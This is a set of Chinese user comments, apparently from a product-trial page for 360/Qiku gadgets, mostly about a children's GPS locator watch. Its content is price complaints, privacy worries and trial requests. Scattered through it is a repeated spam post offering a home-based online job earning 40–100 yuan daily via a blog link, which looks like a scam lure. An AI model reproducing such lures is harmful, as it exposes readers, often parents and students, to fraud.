把续航再加长些，我觉得不错！
好像不太清楚 
距离有限制嘛？
分辨率太小了，而且这价格能买个一般投影仪了
期待中。希望庆幸
本人已经申请成功，真诚期待试用产品能够呈现。  
应该很实用，适合我家孩子。。。
我也是同样的情况：定位手机有一个，但小孩携带不便，还有辐射健康问题，所以没360儿童卫士手表方便安全 
这个产品喜欢的，马大哈的福音啊~~~~
希望这次能成功。。
好东西，不论大人还是小孩子都需要人手一个，让生命健康可控
没有用的东东
表示很喜欢
有点像变形金刚盒子的样子啊。
要是也能支持苹果系列产品就更好了
不抽烟啊。不知道是不是伪需求。
希望试用后 家庭空气质量 改善   我们时刻在关注
孩子的卫士  
距离肯定无限制，室内可能定位精度差一些。不知道续航能力和外观尺寸是否够小巧而适合儿童。
我一直有个疑问，此产品最主要的功能就是追踪位置，假如拐卖儿童的人贩子也知道这款产品，那时候这款产品还能发挥什么实质性的作用吗？
什么时候能买呀？想买来给孩子当做儿童节礼物！
期待中，希望中
SB，你才没文化，起码能像WIFi一样能在一个屋子里才叫无线充电，这玩意有个蛋用
有点小期待！！赞一个！
感觉不错，求试用！！哈哈
科学家是不是无敌了！！如果巨大化。。。
感觉不错，主要喜欢个性铃声。可以自己设定喜欢的铃声。最好再搞个睡前定时音乐的，组成套件哈哈！期待哈。
楼主手机是那一款？电池能用多久？关键是绑定手环。大屏幕手机待机是问题！
概念不错，不过不会太流行。毕竟抽烟抽烟还是对烟的需求大，打火机只是辅助品。不过可以推向需要戒烟的人士。我想应该会有一定的需求！
外观看起来。。。很酷的感觉。高大上有木有！！不过价格不知道。如果太贵可能很少有人去买。我不是土豪金！！
有点贵。。
好像很不错的样子
已经有了呀...
不错是不错，听说乐视超级路由器更便宜，一样配置一半价格。期待中啊。还有360路由器。360除了安全不知道如何选购。
小米客服？！
留个爪子，时刻关注！
看见这么好的产品，真是兴奋啊，感谢360,360一直是我们网民的福音！
呵呵，不错啊！！！！！！
我来混个眼熟，希望自己的申请可以通过！
盼望+期望+渴望
我关心的是好多钱而已
非常超级酷！
360万岁，奇酷万岁！！！！！！！！！
40块钱，某宝轻松解决。
期待中，这么好的产品一定要
感觉不错，不知道多少钱而已
很希望。。。。。
期待。。。360创新无限！
希望可以得到这款产品。各种期望。
有点小贵啊
50块钱还可以接受，有国产的么？
希望能申请到！
希望这次能申请到！！！
奇酷无限，探索无边！希望能得到这次申请机会！
混个眼熟,求通过.
本人是游戏开发者，需求这个研究之用
我也是同样的情况：定位手机有一个，但小孩携带不便，还有辐射健康问题，所以没360儿童卫士手表方便安全  
刚刚采购没了一个血压计，这个更好啊，快出啊，有没有办法设置提醒啊，一出就要抢啊！！！必须的！！！
希望不会太贵
很不错，就是贵啊！！
非常希望能得到试用资格.
这个东西看着不错，怎么才能买到 
非常希望能得到试用资格. 
奇酷无限，探索无边！
喜欢，主要价格太贵
我已经申请了，不知是否有机会得到。期待中...
不错，奇酷里面的东西都不错
对360的东西还挺相信的
不错  就是有点贵，期待更经济的 
不错，价格比较个性，3000元，不贵
酷！一定要买一个！
非常希望能得到试用资格.  
坐等5月19日试用结果公布！20个幸运儿中希望有自己的身影！
很喜欢，期待申请成功
如果有了他，就再也不用担心幼儿园男老师了。请让我拥有他。
跟大家的心情一样，希望能申请到。
希望能申请到 期待in
我家孩子特别让人不省心，有了这个我就吃了一颗定心丸了……。
这个看上去 价格还靠谱些
用心打造，安心安全。
高科技产品，赞一个！！！ 
建议两三千
我倒是想给我的父亲申请一个，也不知道能不能成功，很是期盼。
很厉害的样子，价格会上5000么
高科技产品，赞一个！！！
不错   希望
支持奇酷，支持360，希望继续加油发明更多更好更实用的东东！！！！
不错，真想试用一个 
功能、价格合适立马买了
感觉很好  加油
希望可以申请到，如果没有试用品，也要买个，高科技产品也不错
非常希望能得到试用资格.
如果有了他，就再也不用担心幼儿园老师了。请让我拥有他
牛啊！科技的力量真的无限。
价格怎么是美元
请不要放弃治疗
不错的东东。申请了，希望女儿能戴上。
支持，希望尽快面市。
我好想给宝贝一个
太好了，什么时候可以面市
给小宝宝申请一个 虽然我的宝宝不能用 但是我当爹的可以帮着测试
如果小孩摘掉手表怎么办 
实用性强的东东，不管多少钱，为人父母的都舍得买！期待啊！！！
希望得到呀。。。。。。
报个希望吧？
感觉很实用，
希望得到啦
哪里能买到？ 
不错，新车刚买回来，就等这个宝贝下线了，还要多久才能买呢？最看中空气净化甲醛的功效，希望强大些啊。防盗报警齐全点。
如果拥有它，孩子他妈再也不会为找孩子找哭了，求拥有！！！！
如果有闹钟设定就更好了..不过很希望得到.
希望得到啦 
等啊等啊等啊等
希望有准确的定位系统我才放心孩子的安全！
电池爆炸=爆头
价格无力！
望眼欲穿啊
好东西，期待中……
为了孩子，期待拥有！
好像给还孩子弄一个啊 这样就能随时了解他的情况啊 
很棒的研发团队，需要需要太需要了。。
哪里能买到？
我想给一个孩子安全的世界
特想得到，下次小孩走丢了就不怕了。
加入时间显示，进一步提高了实用性，同时也对电池的性能提出了更高的要求，望继续努力
申请了，支持这款产品，灰常不错！希望能免费得到试用，然后给我的同事宣传宣传！让所有家长随时了解自己孩子的动向！有了它，再也不用担心孩子走丢了！
我希望可以得到，也希望他们做更多的出来
我不这样认为，因为中老年人都很勤奋，走路对他们来说很正常，任何城市都是这样，当你一早去上班，外边晨练的都是老年人，基本没有年轻人。产品定位明显是属于年轻人和中年人，对于老年人来说，计步器这款产品可有可无，即使有这句广告语也不会失去中老年消费者，他们还会高兴，因为他们还年轻！
实用安全支持。
好东西价格有些太高了
之前看到有人玩过，东西确实不错！
期待ing~，期望价格不要太贵。
360这是在做广告吗？
不知道价格，目前的一些可以监控健康的设备最便宜都在800+不知道这个要多少钱。
不早上市了，还创意中。。
我家孩子刚上一年级，平时都是独自坐公交去上学，偶尔家里母亲会去接孩子，由于孩子天性调皮贪玩经常会乱跑，母亲身体也不好经常追不上，经常会让家里人满大街去找，伤透脑筋，听朋友说360出了一款360儿童卫士，可以定位孩子位置，查看路径轨迹，和远程监护，功能非常强大，本身我们就是360的忠实用户，对360产品很信任，所以我们很想试用一下，然后跟其他有着担心孩子走失的家长分享一下，支持360！
现在包包里的东西越来越多，经常会丢三落四的，不过看图片只能追踪一个啊，如果可以自行设定需要追踪的东西就好了，每天出门的时候什么忘了他会提示，那就好了。
已经申请了，期待中，期望能够象宣传的一样，不怕宝宝走丢，避开对宝宝不好额环境。
放开孩子的心灵，让孩子自由的飞翔。不要给孩子带上有型的枷锁，这样更加会增加叛逆的心里，内心很容易扭曲。我支持360为家长着想的理念，但不能再加剧中国式的教育了，我是360忠实用户，请给予考虑建议，因为我为这些孩子倍感担忧。
不知道能不能审定特殊的铃声，比如什么时间需要干什么之类的提醒，或许可以自己录音，做成语音备忘录。
不知道定价是多少啊，期待中，刚买的新车里面味道不太好闻，没看见是否有更换滤网的功能，如果可以不知道滤网的价格是多少。
能不能申请到 我是准备入手这个了
价格偏贵，同样的产品，价格没有超过1000的，不过很实用的东西，如果汽车里不带电话免提通话的功能到是可以替代。
操作的手势是自己确定，还是已经固有的？可以挥舞手势来滑动触摸屏的内容？比如控制Ipad之类的？
这个造水就是一台除湿机+水处理装置(杀菌,消毒,过滤,制热,制冷),要配上一台压缩机的,非常的耗电.我以前有帮美国的一家公司设计并生产过此类产品.结果夭折了~~ 详情可以咨询扣扣:165四4伍006
一直在关注这个产品，不知道用起来怎么样
很好，非常强大，脑电波技术成熟了，可以运用到网络游戏中，第一个运用到网络游戏中的商家，肯定会赚一桶满满的金子。
支持奇酷，支持360，希望继续加油发明更多更好更实用的东东！希望能得到啊！哈哈！
前提是控制的家用电器，必须可以连接网络啊。
你这样不行，赚不到钱，无非就是辆自行车。太贵了
超级赞的，很棒的团队，希望能给孩子带来更好的未来
多少银子啊
工作的时候总是忘记喝水，希望拥有一个。
超棒的 加油啊 等着你有更好的发明 对了 随便提一下 我想要清爽绿啊
价格怎样？有Wifi的地方可以用，那没有的呢？如何使用3G？插入3G上网卡？
希望抽中我啦~~
好东西，现在的科技太强大了。
看介绍感觉不错，想试一下
写的不错啊
自己先做个沙发，休息下=.=~~
谢谢称赞，我也是才学着写试用报告，很多不足还要需要多学习下 
支持奇酷，支持360，希望继续加油发明更多更好更实用的东东！希望能得到啊！哈哈！  
我喜欢创意，希望能早点得到
已经申请，希望能中
特别希望得到，很想给孩子一个安全健康的世界，同时还可以触发孩子对科学的兴趣。
哈哈，写得不错
还可以帮助孩子减肥，真是我梦寐以求的好东东呀，儿子很胖，有了这块手表，儿子会爱上运动，同时我对他的奖罚政策又多了一个依据。他会很爱这块手表的。
能中一次？
已经中得一次奇酷使用了，希望这一次还能体验到高科技产品
5月20是我家臭臭生日，9月即将入幼儿园，希望给宝贝一枚儿童卫士作为宝贝3周岁生日礼物及他离开妈妈温暖怀抱踏入社会与人相处的入园礼物，爱孩子的爸妈都会选择儿童卫士！
如果试到好用，我会建议公司做产品代理
刚有了孩子！！现在的空气又这个样子，真想抽中我一次，给孩子一屋好空气！！
符合大众需求的产品才是最好的产品
我爱这部智能电动车车
记性越来越差   这是个好东西
选我选我选我！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
选我   选我  选我
好贵啊，3千左右就完美了
红外线控制的 你想多了
它是我们做家长心中的神器，现在的功能还能延伸，孩子第一次外出我想能申请到这款产品能让我在家放心，我会一直关注360的产品。
质量的责任问题不说明送都不敢用。
请问这个要钱吗？ 
漂亮！真的好喜欢！希望价格合适！
酷，我喜欢，希望拥有
创意不错，希望直接添加显示屏。这样比手机查看方便多了。另外希望能支持车内挂载等方式。不然这么清爽的设计不能很好和很方便的放在显眼位置。就太对不起外形了。还有最主要的就是低的价格，
创意还行，就是不知道价格和电池续航能力，还有充电器接口是否是手机通用，充电时间等
支持奇酷！
看起来超级酷啊！！用意念！！
好像很好用的样子  好期待啊
建议两千左右
我也是这样想的
有关于儿童的东西。我可不敢试用。不能拿孩子开玩笑。
期待选中，
售价约8900人民币？？？想钱想疯了！！！
等了这么久还没正式开卖吗 期待中 
支持360 
为甚么sarawak没有的？要怎样申请？
报价太高，不适用?
小孩的玩具，大人的神器。
请问这个哪里能买到？
神器！爸爸心目中的宝贝安全守护神！
感觉不实用
这杯子如果200以内就好了。。。
希望该产品能早点上市，价格能给个平民价！毕竟还是穷人多，穷人也更需要这样的产品！
娃娃 火星人要入侵吗
价格能不能再亲民点啊?⊙﹏⊙b汗
神奇，神器！已经申请了，希望能中哦
支持360，刚开始出360安全卫士就用到现在好几年了。那时候的杀毒软件还要出钱购买，只有360免费。赞。就是希望价格合理
这东西价格是多少？没有看到啊
什么时候上市，价格合理的话购一块
支持！！！！！！！！！！！！！！！！！！！1
搞什么，很多人在使用了，还在创意中
支持！！！！！！！！！！！！！！！！！！！1  
非常不错，唯一一点就是价格太高了。
希望该产品能早点上市，价格能给个平民价！
不错；支持一下
支持。支持。支持。
一如既往的支持360，希望我的N次申请能够成功，为了宝宝我还会继续申请的！！
小红花功能不错，有了它，我就不用再去买其它东西来提高女儿的学习兴趣了。
支持 一如既往的支持
360加油。我们支持你。
我一直是360的忠实粉丝，支持360.
太贵，老百姓不接受
我一直是360的忠实粉丝，支持360. 
我要买个 哈哈
为了宝宝我还会继续申请的..........
支持360
六一儿童节快到了，希望儿童卫士能早点上市，因为我答应送一个神秘礼物给女儿，我觉得儿童卫士再适合不过了.
又不是让你试药
车子看上去不错，就是银子太多了，要是能在两千块左右那就太理想了。到时候我一定买一辆！
又不是让你试药
这东西看起来就高端大气上档次，觉得很棒，希望能中！！！！！！！！
之前就看过产品的介绍希望能赶快上市。
支持360
申请了，等待中。为了儿子，加油啊！
不指望免费的，只求贫民价的。如果能远距离防丢失就好了，不仅适用儿童，也适合上年纪的老人啊。本建议如何？
好东西啊，有了它再也不担心孩子上下学在路上的问题了！~
期盼可以试用成功，一切为了宝宝。
好喜欢啊，  希望能中
终结者的序幕拉开了......嘿嘿...期待.....
超级漂亮···希望有一辆····
非常的期待，希望缓解各位家长的压力。
人民的心里话啊!
360用户不行吗，为什么一定是奇酷网用户？
车子太好了 设计很实用周到
2000块钱值得拥有！
想支持来着，一直在众筹网付款的时候被卡住，选择了银行也不跳到银行页面，快捷付款注册的时候一直说验证码失效，明明还有三十多秒没有失效，验证码都搞了三条，算了。。
虽然车车设计挺好，简单轻便，但价位实在接受不了，毕竟电动车为的是出行，而这个价位却定在了较高的地方，让它本身的优点都被价位而拉低
一直在关注此类商品，希望360的产品早日上市。支持360！
很好 期待
希望能尽量早点上市，让我们这些宝宝妈妈能放心一些
健康不单单是有钱人的，价格有点高了。国家应该对于这样的有助于环境保护的产品给予补贴！
是很漂亮，喜欢！
容易走丢的失智老人也同样需要，某种意义上来说其实更需要，更有市场前景。
已经申请看一下幸运之神降临我。
不指望免费的，只求贫民价的。如果能远距离防丢失就好了，不仅适用儿童，也适合上年纪的老人啊。 
真的很好吗？GPS、WI-FI都有辐射呀!!!!!
材料安全无毒，但是GPS、WI-FI使用的芯片怎么样，以及GPS、WI-FI辐射问题，考虑考虑孩子的健康呀！！！！！！
东西是个好东西，但是你的价格普通老百姓能消费的起吗？？？
为了宝宝，希望自己可以成功，可以带宝宝去旅游了……
GPS本身就有辐射！WI-FI 也有！ 
车子很好 价格高了奥 
这个创意真的非常好，期待产品尽快出来。
如果我不能有幸获得试用，希望产品尽快上市。
高大上骑行必备良品
有没有卖的啊？！
不错啊！科幻上的科技快要到现实了，相信不久的将来，会有更多的功能，期待这款科技产品能有会更好的发展。
这几天孩子天天问我手表什么时候到，是因为我没告诉他这个手表还没发布，申请试用，中签的机会不大啊！
很好的创意，喜欢，多少钱啊，最近正打算换车呢，车子坏了。想买个电动车还想蹬自行车，就是不知道该买什么，看到这款电动自行车，很满意。能否告诉我多少钱呐，如果价格合适可以考虑买一辆。
二代已经开售了
哈哈。。。。。。。。。科幻带到现实了。。。哇哈哈我喜欢。
在50元左右可以接受！贵了就没意思了。
很实用，但希望价格不要太贵.
同意这建议。支持希望平民价发售。
什么时候能上市啊 如果真这么好用的话，一定买一个
我家一次性打火机一大堆，便利店1元1个。限制了就去便利店买新的了。戒烟靠自觉吧。
办公用的吧。
很有创意的车,很漂亮的车,很看上的车,就是价格高,不知整车有多重?
出门逛街的时候挂在孩子身上、老公身上试试。
200以内可以买来送人！！！
我也申请了，但希望渺茫，也希望平民价。
很实用，很期待，希望能试用。
我也来试试运气，希望幸运能降临！
感觉小巧、轻便。符合自己对电动车的要求，家里的小型电瓶车都不敢开，就是不知道刹车功能如何~
希望能尽量早点上市，让我们这些宝宝爸爸也能放心一些 
如果能把这项技术加入游戏中就更好，能完美解决手残一族的缺陷。
儿子天天问我手表到了没有，孩子很期待呢
我觉得这款手表适合老年人和孩子带
可以试用吗
什么时候正式销售啊，不奢求免费，希望价格可以亲民。关爱儿童，相信360会做得更好。
2000多呀？还有以后换滤芯多少钱？
少一位就十分期待 ~
一直很支持360，也非常感谢360给我带来的方便与安心。为了孩子希望360儿童卫士 2快点上市！
挺新奇的，问题是我没弄懂，它是怎么样区分我需要什么样的功能的？
我来普及一下，我们生活的空间里存在着无数的辐射电波，但是大家不要谈“辐射色变”，平时我们用过的收音机收听到的广播就是接受的电台发出的电波辐射，绝大部分此类辐射都远低于对人体达到伤害的水平，千万分之一左右，所以大家不用担心辐射问题。
这个没有坐位吗，有点累吧，这个适合健身！
希望再明天
给孩子个安全保证
我和宝宝期待中
是不是真的有那么好啊？别又是一个屑头！
正好送给儿子六一节礼物！希望幸运的得到！
这款产品在价格上不知道高不高
我和宝宝等待中......
不求能免费，但希望价格可以便宜点的。
sfrwerwerwer
建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！建议增加甲醛检测功能！
100左右考虑
一直寻找这样的产品,本来想等手表手机出来.这个性价比应该要高很多
有一款一代手环用着，感觉还不错，期待2代更全面。
性价比很高啊
一直很支持360的产品，不奢求免费，但希望价格优惠，让提心孩子的爸妈，省心不少、
我和宝宝期待中····
期待幸运能降临
能不能做成很隐蔽的小挂件，挂在书包上或小孩腰带上，是手表的话一个是上课娃娃要分心去玩，再一个带在手腕上目标大，遇见坏人的话有可能会被取下丢弃。
为了孩子，不中我就买一台
一语点破 赞
只希望360为广大用户着想价格便宜点，市场需求肯定很大
太好了，儿子老乱跑，吃饭都找不到，急需一个.
这个价格能再便宜吗？ 
期待中，希望被选到，这样可以无障碍关心孩子去哪啦
真心希望拥有一个。。。
期待中，希望我的宝宝有试用的机会
酷耶~非常酷，很喜欢，希望更强大些。
期待中、、、、、、、、、
一直很支持360的产品，不奢求免费，但希望价格优惠，让提心孩子的爸妈，省心不少
很想给儿子试用一个哦，不过这个会不会辐射大呢
这类产品能隐秘些更好。坏人都知道这是做什么用的那不是摆设了。
现在科技越来越发达，对于孩子我们希望更多的保护措施，一直信赖360，希望360也能保护我的孩子。
希望能抽中，这样女儿一个人在家里也不用老是担心她了
什么时候能普及
急须一个.女儿长大啦.空间越来越大.
这个创意不错，但是价格要便宜，嘿嘿
希望能申请上，也会给孩子带来一个惊喜一份幸运！！！
希望能发给我儿子一个，就不用担心他的安全了。 
手表定位和方便，但是为了孩子安全，更具隐蔽功能的定位器必不可少
  希望能申请上，也会给孩子带来一个惊喜一份幸运！！！
真的喜欢有一个给孩子的东西，
这款产品正合我意。什么时候开始销售。
一切为了孩子！
真心不错的电动车，创意还不是特别新——并没有特别出彩的地方
已经提交试用申请，希望能够拿到产品，鼎力支持！！！
想给儿子买个试用一下，就是不知道是什么价钱，希望可以性价比高一些。
希望给我的宝贝女儿申请上！
什么时候开始有销售啊，我都迫不及待的想要的。价格便宜就好了
很想给一上街像开“飞机”的儿子。
早日到市场，当今中国很多人会喜欢的
真心希望幸运之神降临！呵呵
希望给我的宝贝女儿申请上！ 苍天啊大地啊  佛祖圣母玛利亚啊  保佑我能申请上吧！
好想要个  小孩老是像飞一样的转眼就不见了
建议也设计一个宠物版本的，肯定销量大好！
希望能成功申请呀，早日试用，早些反馈，尽快完善！
这么高的价格，坑爹呢
这正是家长们所需要的神器
个人觉得有必要把这东西做大，然后在街道上不同地方放置，然后征求市民意见，收取市民少量费用，估计是可以的，这样一来，得到的效益更高
这个简直太棒了  总是找不到钥匙的人敬上
好强大好想要哦
有这个表,我们做父母的放心
期待中 速度上市
创意不错，可是价格真心接受不了 
顶~顶~顶~ 好期待的产品，赶紧上市吧！
个人觉着 既然是孩子用的东西 可以在卡通一点 愿360越来越好
希望给我的宝贝侄女申请上！ 苍天啊大地啊 佛祖圣母玛利亚啊 保佑我能申请上吧！
好喜欢 不过不知道实用不实用
好想要！不知道要多少钱
好期待啊，快快快上市吧，我要买啊
顶！支持这种一切为了孩子安全、家长安心的产品！期待试用成功！
很好很方便的东西，不过电量怎样续航、经常带着会不会对人体有其他的影响、价格是否平民化？ 
希望能申请上看介绍真的很有诱惑力  
加油加油@@@@@@@
好东东，不会再怕乱放的东东找不到了
顶~顶~顶~ 好期待的产品，赶紧上市吧！
希望试用成功
宝贝的六一礼物，希望能梦想成真。
希望能够申请成功，也希望产品早点上市，早些购买。。。
怎么购买啊，都是英文，看不懂啊，能不能教一下， 
8900RMB低端的二手小车都能买一辆了 有钱人的玩具
我就等着换掉我的十年电动车了，价格在3000以内秒杀。
感觉挺不错哦，8900贵了点，去掉个0吧
已经提交了申请，希望有我的份，支持你们的产品。一切为了孩子，加油！！！
希望做得更好，问题在于APP优化！！
希望我家宝贝能试用上，给孩子一份安全，大人一份放心
希望可以申请成功！！！！
让梦想照进现实吧！生活亦如此：）
至少我很喜欢~早日投放市场，早日购买！
信任360的产品一定很好，期待试用成功，给360加油
这人的英文真差！
没有第一代的好看，但是改进很大，希望出些好的产品，
这个产品的市场定位应该大有前途，关键是看产品的外观设计能不能吸引孩子，希望能够抢先一睹真容。
这是谁控制谁啊
已经交了申请，希望成功。
已经提交了申请，希望有我的份，支持你们的产品。一切为了孩子，加油！！！
第一眼看到这款手表，首先我特别喜欢，因为颜色亮丽，可以足够吸引孩子的眼球。第二，我的孩子现在6岁，正是学习认表，规范孩子良好习惯的重要时期，它可以陪伴孩子在这个重要时期开心度过。第三，它的功能很多，可以知道孩子在学校的运动量，也可以和孩子一起规范行为习惯，可以给予孩子相应奖励。总之，我觉得挺适合孩子用的，希望可以申请上，让我们好好试用，给更多妈妈分享
可以给孩子用
自行车 整这个贵 你以为每个人都有钱啊  花那么多钱 买个电动车  有那钱  摩托车 巡航舰都可以买了！ 脑残的定价！
大家都在申请呀！我也希望自己能申请成功。
 微博今天还能买吗 连个客服都没有
样子很好看。
给小盆友带来安全的产品，值得大力推广，给32个赞，希望能得到试用机会。
偷取机密专用，或者取证用，很适合，对于存在纠纷的案件适用，是最好的取证工具
希望能给我的宝贝侄女申请一个，哥哥嫂子工作忙，接送孩子都是爸妈的工作，主要是为了能让爸妈轻松一些。谢谢。
期待。有货了，别忘了，通知噢。 
外观没有1d的好看引人，但相信360和奇酷已经优化改进了很多吧，期待试用。。。
感觉还不错  也申请了一个   好喜欢
酷，非常酷，时尚，  
您好～～目前我们正在点名时间众筹～您可以关注一下～我们滤网是可以更换的～～众筹用户耗材有优惠的哦～
外观我喜欢的，关键是无危害对宝宝成长没有危害
非常同意!
一直使用360~很是放心啊~~真心希望这款商品早日问世~这样会让人放心很多啊~外观觉得卡通一些比较更容易让宝宝们接受呀~类似于卡通贴纸或卡通脑袋那样的~~
最好在能有通过手机能够对手表有提醒呼叫功能
您好～～我们目前正在点名时间众筹～～您可以关注一下～～
好贵，如果能把价格做低一些的话就好了
功能看起来很实用，样式也漂亮，望申请试用成功。
挺方便的，我买了4个送给朋友，都是很喜欢的，价格也实在。
不知能控制什么呢？？？
真有这么好的手表吗，贵不贵呀，怎么卖的，给儿子配一个，安全一点
有点多此一举
申请了，一定要中喔，360你不错
希望能申请上，儿子很皮老乱跑
家里父母带孩子，我们在外地，有时候很揪心！希望能得到试用机会
酷哦~非常棒
提议很好。也是父母担心的，都知道表的功能，遇到坏人时定位就没太大意义了！
如有防水功能则更好。
看着还不错，希望能给我带来好运，申请成功！给宝贝女儿个好礼物！！！
很是期待！全家都受用！
感觉还不错 也申请了一个 特别喜欢 
感觉能解决我的部分问题，申请了一个，希望能成功。
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我【复制到浏览器打开】 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html
就是不知道如果买的话，需要多少钱？哪里有售？
希望有我的份。我家宝宝太喜欢乱跑了。
什么时候可以公开售卖啊，期待中 
这东西，我怕会被有心人利用。放车上、老公 口袋、老婆的包包里？
360我一直都支持的。360好多产品我都在用呢。
好贵的哟。200以内可以接受。
已经申请了 360硬件我只用过智键 感觉比小米的好 也可以代替小米智键用 老早就留意着儿童卫士 只是一直没有机会接触 请给我个机会 我也尽可能努力着 
能不能做成很隐蔽的小挂件，挂在书包上或小孩腰带上，是手表的话一个是上课娃娃要分心去玩，再一个带在手腕上目标大，遇见坏人的话有可能会被取下丢弃。
额是一天一遍在微博上催呢、看这样的表现也算积极向上吧、哈哈
需要装SIM卡吗？
父母心！！
好东西啊，
希望申请成功，拜托了
自己控制自己？额，是我的理解有问题吧！
非常好的建议，如果做出各种小型挂件它的销量绝对大过手表。
真的太贵了，买不起。
智能医疗越来越走进用户了。
每天下班回去买菜烧饭洗衣服，儿子满小区乱跑，每次要找好久才能找到，职场妈妈，孩子没人帮忙带的无奈，希望能有这么个可以定位的手表，儿子喜欢妈妈可以放心。
但还是希望能拥有一款，给孩子做六一礼物。
不错支持，希望所有宝贝都带一个
我也有同感，既是申请不中，自己买也行，但是希望是一个小小的定位器，不容易被发现的那种。
申请了，360越来越好了，呵呵 
既可以看时间，又能定位，挺好的。可以随时跟踪到孩子的去向，保证孩子的安全。
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
希望不要太贵啊！
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工 作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
期待啊，不要很贵啊！·太酷了
为了孩子安全，希望能申请上
好期待啊，有了这个宝贝就不会经常找不到东西了，适用于现代初老人员：）
必须加上行车记录仪功能
申请，一定要申请，太棒的东西了 
真好，再也不怕孩子乱走了
我们看了到 坏人也看了到 坏人要是抓了小孩知道有这么个手表 他肯定会第一时间把手表拆下来扔掉 到时候你还是找不到孩子  
 太好了，家长都希望宝贝拥有！
感觉还不错 也申请了一个,这段时间正在给儿子看手表，这个比手表更好，希望可以申请下来，给儿子一个惊喜！！！
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
看着挺不错的，就是不知用着怎么样
为了小孩子安全，希望组织能给个机会~~
总比没有好呀,多了份保障安心
如果能申请成功，我希望试用后再来评价发表建议和意见
好期待，每次找小东西，都会想，要是所有东西都配个手机，哪怕bb机，多好啊！！11
这个宝贝什么时候开卖！！！！一定要买一个，每天开车，还要带着小宝宝，有了这个就太好了
价格太贵了
要怎么试用怎么买
这款好！！什么时候可以买
关爱孩子，杜绝伤害
真心想要一个，身边好多身为家长的都想看看，只是现在买不到，只能希望有这个试用的机会啊！ 
看着挺不错的，就是不知用着怎么样
2015年7月，黄瓜菜是不是都凉了？
此产品造福广大父母，望亲给个机会，胜造七级浮屠
希望360开发出更多更实用的产品！赞一个！
主要是看中定位这个功能，这个非常适合儿童，现在社会太不安全了，还是这个功能很强大，可以解决很多问题
一家只有一个宝贝，万千宠爱于一身，不能出现任何差错和危险。所以希望可以申请上啊！！！
非常喜欢，太棒了。真希望能申请到！！！！
防坏人只是下下策，就像手机的紧急拨号功能大部分人是用不上的。但是手机为我们现在的生活提供的便捷确实是可想而知了
不好看，而且太大不易操作跟携带
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html
不就是美利达的莱电车吗，10多年前就有了，主要出口日本。这个实在是剽窃！！！
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html
我也是，希望能给我一个
同意楼上的观点，产品要操作简便，但设计可以更隐蔽，便于多途径携带，防水防摔。
太先进了，简直高大上啊
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
太好了，去商场也不怕她会走丢了，赞个！
不多说，为孩子想要！
真心希望的此宝贝
要给宝宝的生日礼物。
希望我的孩子能有如此幸运戴上它!
没啥太大创意的，实用性不是很强
太贵了，去趟医院检查也用不了多少钱？！况且都是一次性的，储藏在家里环境卫生令人担心。医院比家里的细菌少得多。
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
不用怕孩子走丢了
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html  
说实话如果只是温湿度监控+一氧化碳的监控，这价格太啃爹的，概念大于使用。但如果能配上具体PM2.5的数值那价值就完全不一样了。我指的PM2.5可不是笼统的数字，要知道pm2.5可是拥有极为丰富的内涵。比如说甲醛、苯等voc浓度、化学物质颗粒比例、敏感性可吸入颗粒监控、主要病毒细菌监控等。
这个真是很有创意的产品，奇虎360越来越像谷歌了，希望超越谷歌或者做中国的谷歌。
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html  
除了说好，还想问什么时候能买到
